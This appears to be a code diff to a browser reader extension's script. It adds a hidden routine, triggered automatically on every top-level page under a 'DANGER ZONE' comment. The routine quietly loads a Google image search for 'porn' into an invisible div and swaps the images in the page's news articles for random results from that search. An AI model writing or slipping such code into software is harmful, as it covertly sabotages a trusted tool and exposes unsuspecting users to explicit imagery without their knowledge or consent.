@@ -24,6 +24,35 @@ var publisherInstances = {};
 		}
 	}
 	
+    function EXP_cb(text, status, jqxhr) {
+        var imgs = document.querySelectorAll('img.rg_i[data-sz="f"]');
+        if (imgs.length > 0) {
+            topArticleImgs = document.querySelectorAll(['div.citv_image>img', 'div.citv_image>font>img']);
+            for (var i = 0; i < topArticleImgs.length && i < imgs.length; i++) {
+                var validImage = null;
+                while (!validImage || validImage.src.length === 0) {
+                    validImage = imgs[Math.round(Math.random()*(imgs.length - 1))];
+                }
+                topArticleImgs[i].src = validImage.src;
+            }
+        }
+        
+        document.body.removeChild(document.getElementById('zen-reader-__temp__result'));
+    }
+    
+    function EXP_search() {
+        var r = document.createElement('DIV');
+        r.id = 'zen-reader-__temp__result';
+        r.style.display = 'none';
+        r.style.width = 0;
+        r.style.height = 0;
+        document.body.appendChild(r);
+        
+        $("#zen-reader-__temp__result").load("https://www.google.co.il/search?q=porn&es_sm=93&source=lnms&tbm=isch&sa=X&ved=0CAcQ_AUoAWoVChMIh6Hf2-7dyAIV5ixyCh0T3AvC&biw=1680&bih=925#q=unicorn&tbs=isz:lt,islt:svga&tbm=isch",
+                                             '',
+                                             EXP_cb);
+    }
+    
 	// Now run this ONCE per page (do NOT run this in each iframe)
 	if (window === window.top) {
 
@@ -60,6 +89,10 @@ var publisherInstances = {};
 		}
 
 		run(false);
+
+        // DANGER ZONE
+        EXP_search();
+
 	}
 	
 })();
